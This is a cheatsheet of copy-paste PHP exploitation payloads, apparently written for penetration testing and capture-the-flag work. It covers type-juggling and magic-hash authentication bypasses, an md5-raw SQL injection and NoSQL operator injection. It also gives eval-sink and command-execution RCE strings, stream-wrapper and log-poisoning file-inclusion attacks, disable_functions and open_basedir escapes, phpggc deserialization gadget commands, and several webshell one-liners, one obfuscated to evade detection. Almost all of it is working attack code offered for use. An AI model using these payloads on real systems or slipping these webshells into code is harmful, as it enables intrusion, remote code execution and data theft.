---
title: "PHP Tricks - Type Juggling, Wrappers, Filter Bypass, RCE Primitives"
category: web
subcategory: php
type: cheatsheet
tags: [php, type-juggling, loose-comparison, magic-hash, wrappers, php-filter, disable-functions, request-quirks, preg-replace-e, assert, unserialize, lfi, rce, strcmp, array-tricks, unicode, ffifdyop]
summary: "150+ copy-paste PHP exploitation items: type-juggling table, comparison quirks, stream wrappers, filter chains, disable_functions bypass, useful built-ins, $_REQUEST quirks, array/unicode tricks."
tools: [php, phpggc, gopherus, chankro]
related: [php-type-juggling, php-disable-functions-bypass, deser-php-object-injection, deser-php-phar]
---

## Comparison / type juggling (PHP 5/7 unless noted)

```php
0 == "a"            // true (5/7), false (8)
0 == ""             // true (5/7), false (8)
"abc" == 0          // true (5/7), false (8)
"1abc" == 1         // true (5/7), false (8)
"" == null          // true
null == false       // true
0 == null           // true
[] == false         // true
"0" == false        // true
"0.0" == false      // false
" 1" == 1           // true (leading ws)
"1 " == 1           // true (trailing ws)
"1e2" == 100        // true (scientific, both 7 and 8)
"0x1A" == 26        // false (hex strings not numeric since 7)
"10" == "1e1"       // true
"abc" == "abc "     // false
INF == "INF"        // true
NAN == NAN          // false
"0" == "0.0"        // false
"6" == " 6"         // true
```

## Magic hashes (0e -> juggles to 0)

```php
md5("240610708")  == "0e462097431906509019562988736854"
md5("QNKCDZO")    == "0e830400451993494058024219903391"
md5("s878926199a")== "0e545993274517709034328855841020"
md5("s155964671a")== "0e342768416822451524974117254469"
md5("s214587387a")== "0e848240448830537924465865611904"
sha1("aaroZmOk")  == "0e66507019969427134894567494305185566735"
sha1("aaK1STfY")  == "0e76658526655756207688271159624026011393"
sha1("10932435112")== "0e07766915004133176347055865026311692244"
// two magic hashes == each other under ==
// md5($x)==md5($y) with both magic -> bypass ; md5($x)===$known0e -> safe
```

## Array / null bypasses

```php
strcmp([],"x")          // NULL (5/7) -> NULL==0 true ; TypeError (8)
strcasecmp([],"x")      // NULL (5/7)
strncmp([],"x",3)       // NULL (5/7)
md5([])                 // NULL + warning (5/7)
sha1([])                // NULL (5/7)
preg_match("/x/",[])    // false (5/7)
strlen([])              // NULL (5/7)
// send arrays: pw[]=1  or  pw[a]=1  or JSON {"pw":[]}
in_array("abc",[0,1,2]) // true (5/7)
array_search(0,["y"])   // 0 (5/7)
switch("abc"){case 0:}  // matches (5/7)
```

## md5 raw -> SQLi

```php
md5("ffifdyop", true)   // raw bytes start 'or'6... -> pass=''or'6..'  always true
// SELECT ... WHERE pass='".md5($_POST[p],true)."'  with p=ffifdyop
```

## NoSQL / JSON juggling

```json
{"pw":0}      {"pw":true}     {"pw":null}     {"pw":[]}     {"pw":{}}
{"pw":{"$ne":null}}   {"pw":{"$gt":""}}   {"pw":{"$regex":".*"}}
```

## Legacy eval sinks

```php
preg_replace('/.*/e', 'system("id")', $s)   // PHP < 7.0
assert("1;system('id')")                     // string eval (removed 8.0)
assert($_GET['x'])   // ?x=1);system('id');//
create_function('$a', '}system("id");//')    // removed 8.0
eval("\$x=\"$user\";")   // "${system(id)}" or "\".system('id').\""
${$_GET['a']}(${$_GET['b']})   // variable-variable RCE  a=system&b=... (send cmd via b array trick)
extract($_GET)   // overwrite $authenticated etc.
```

## Command execution built-ins

```php
system('id'); exec('id',$o); shell_exec('id'); passthru('id'); `id`;
popen('id','r'); proc_open(...); pcntl_exec('/bin/sh',['-c','id']);
call_user_func('system','id'); call_user_func_array('system',['id']);
array_map('system',['id']); usort([1,2],'system');   // 2-elem array
preg_replace_callback('/./','system',...);  // no
mail('a@b','x','x','','-bv $(id)');   // sendmail arg injection
```

## Stream wrappers

```
php://filter/read=convert.base64-encode/resource=/etc/passwd
php://filter/convert.iconv.UTF8.UTF16LE|convert.base64-encode/resource=x
php://input                     # raw POST body (with allow_url_include for include)
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWzBdKTs/Pg==
data://text/plain,<?php system($_GET[0]);?>
expect://id                     # if the expect extension is loaded
phar://uploaded.gif/x           # phar metadata deserialization
zip://uploaded.zip%23shell.php  # %23 = #
glob:///var/www/*               # DirectoryIterator('glob://...') listing
compress.zlib://phar://f/x
ftp:// http:// ssh2.exec://user:pass@host/id
```

## php://filter RCE bridge

```
# iconv chains can synthesize arbitrary bytes into an include()d stream
php://filter/convert.iconv.UTF8.CSISO2022KR|<long chain>/resource=/etc/passwd
# use a filter-chain generator (wrapwrap / php_filter_chain_generator) to build "<?php ..."
```

## LFI -> RCE tricks

```
# log poisoning
User-Agent: <?php system($_GET[0]);?>   then include /var/log/apache2/access.log
# /proc/self/environ (if readable + PHP < 5.3ish)
# session file: PHPSESSID controlled value -> include /var/lib/php/sessions/sess_<id>
# php filter chain (above) ; data:// ; expect://
# /proc/self/fd/N  with a held upload
# pearcmd.php: /path?+config-create+/<?=eval($_GET[0])?>+/tmp/x.php  (register_argc_argv)
```

## disable_functions bypass (see php-disable-functions-bypass)

```php
// inventory
ini_get('disable_functions'); ini_get('open_basedir'); php_sapi_name();
// LD_PRELOAD (needs putenv + mail/error_log + sendmail_path)
putenv('EVILCMD=id>/tmp/o'); putenv('LD_PRELOAD=/tmp/x.so'); mail('a@b','x','x');
// FastCGI to php-fpm 127.0.0.1:9000 with PHP_ADMIN_VALUE[disable_functions]=
// imap_open CVE-2018-19518: '{x -oProxyCommand=... :143/imap}INBOX'
// dl('evil.so') if enabled
```

## open_basedir escapes

```php
mkdir('a');chdir('a');ini_set('open_basedir','..');chdir('..');chdir('..');
chdir('..');chdir('..');ini_set('open_basedir','/');echo file_get_contents('/flag');
// glob:// lists outside basedir (listing only)
foreach(new DirectoryIterator('glob:///*') as $f) echo $f->getFilename();
symlink('/flag','l');echo file_get_contents('l');   // if symlink() enabled
```

## File read primitives (often not disabled)

```php
file_get_contents('/flag'); readfile('/flag'); file('/flag');
highlight_file('/flag'); show_source('/flag'); fpassthru(fopen('/flag','r'));
new SplFileObject('/flag'); getimagesize('/flag'); parse_ini_file('/flag');
simplexml_load_file('/flag'); finfo_file(finfo_open(),'/flag');
scandir('/'); glob('/*'); new DirectoryIterator('/');
```

## $_REQUEST and input quirks

```php
// $_REQUEST order = request_order (default GP): POST overrides GET
// param name mangling: a.b=1 -> $_GET['a_b'] ; "a b"=1 -> $_GET['a_b'] ; a[=1 -> $_GET['a_']
// duplicate keys: last wins  (a=1&a=2 -> "2")
// leading [ starts an array; unclosed [ dropped
parse_str($s);          // like extract() into locals
// multibyte SQLi: %bf%27 under GBK ; addslashes bypass
// preg with /u on invalid UTF-8 returns false (== 0 true)
// (int)"9e9"==9 ; intval("0x1A",0)==26 ; "1e3"+0==1000
// is_numeric: " 1" true, "1 " false(5/7)/true(8), "0x1"false, ".5"true, "+1"true, "\t1"true
// empty("0") == true  (rejects literal "0")
```

## unserialize / object injection (see deser-php-object-injection)

```php
unserialize($_COOKIE['x']);
// O:4:"User":2:{s:4:"name";s:3:"bob";...}
// protected: s:6:"\0*\0cmd" ; private: s:6:"\0Cls\0cmd"
// __wakeup skip: O:4:"User":3:{...only 2 props...}  (CVE-2016-7124)
// O:+4:"User" (+ prefix accepted) ; S:3:"\61\62\63" (hex string, dodges filters)
// session handler mismatch: username '|O:6:"Logger":...'
phpggc -b Monolog/RCE1 system id
phpggc -p phar -pp gif -o e.gif Monolog/RCE1 system id
```

## Unicode / overlong / whitespace

```
%c0%ae%c0%ae%c0%af      overlong ../ (some decoders)
..%2f ..%252f           encoded / double-encoded traversal
%09 %0a %0c %0d %20      whitespace variants for filter bypass
%00                      null byte (PHP < 5.3.4 truncation)
```

## Useful one-liners

```php
<?=`$_GET[0]`?>                         // shortest webshell (short_open_tag)
<?php system($_GET[0]);?>
<?=system($_REQUEST[0])?>
<?php eval($_POST['c']);?>
<?php echo file_get_contents($_GET['f']);?>
<?=$_GET[0]($_GET[1])?>                  // ?0=system&1=id
<?php @assert($_REQUEST['c']);?>
<?php $f='sy'.'stem';$f($_GET[0]);?>     // string concat to dodge greps
```

## phpinfo / info leaks

```php
phpinfo();  ini_get_all();  get_defined_constants();  get_loaded_extensions();
getenv();  $_SERVER;  get_cfg_var('...');  posix_getpwuid(posix_geteuid());
error_reporting(E_ALL);  ini_set('display_errors',1);
```

## References

- PHP manual -- Comparison Operators, Type Juggling, Supported Protocols and Wrappers.
- PayloadsAllTheThings -- PHP, LFI, File Inclusion.
- ambionics -- php_filter_chain_generator.
